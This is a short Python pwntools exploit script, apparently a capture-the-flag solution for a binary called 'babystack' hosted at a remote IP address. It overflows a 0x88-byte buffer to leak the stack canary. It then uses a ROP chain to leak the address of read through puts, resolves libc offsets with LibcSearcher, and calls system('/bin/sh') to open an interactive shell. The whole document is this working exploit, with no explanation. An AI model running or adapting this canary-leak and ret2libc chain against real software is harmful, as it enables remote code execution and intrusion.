from pwn import *
from LibcSearcher import *
import os
context.log_level="debug"
context(arch="amd64",os="linux")

ROP_PopRdi = 0x400a93
ROP_Ret = 0x40067e
ADDR_GOT_read = 0x600FD0
ADDR_PLT_puts = 0x400690
ADDR_SYM_main = 0x400908

p = remote("111.198.29.45",38563)
#p = process("./babystack")
p.sendlineafter(">> ","1")
payload1 = b'0'*0x88
p.sendline(payload1)
p.sendlineafter(">> ","2")
p.recvuntil("00\n")
canary = u64(b"\x00" + p.recv(7))

print(hex(canary))
p.sendlineafter(">> ","1")
payload2 = b'0'*0x88 + p64(canary) + p64(0) + p64(ROP_PopRdi) + p64(ADDR_GOT_read) + p64(ADDR_PLT_puts) + p64(ADDR_SYM_main)
p.sendline(payload2)
p.sendlineafter(">> ","3")

GOT_read = p.recvuntil("\n").split()[0]
for i in range(len(GOT_read),8):
	GOT_read += b'\x00'
GOT_read = u64(GOT_read)

libc = LibcSearcher("read",GOT_read)
ADDR_LibC_base = GOT_read - libc.dump("read")
ADDR_system = ADDR_LibC_base + libc.dump("system")
ADDR_String_Sh = ADDR_LibC_base + libc.dump("str_bin_sh")
p.sendlineafter(">> ","1")
payload3 = b'0'*0x88 + p64(canary) + p64(0) + p64(ROP_Ret) + p64(ROP_PopRdi) + p64(ADDR_String_Sh) + p64(ADDR_system)
p.sendline(payload3)
p.sendlineafter(">> ","3")

p.interactive()

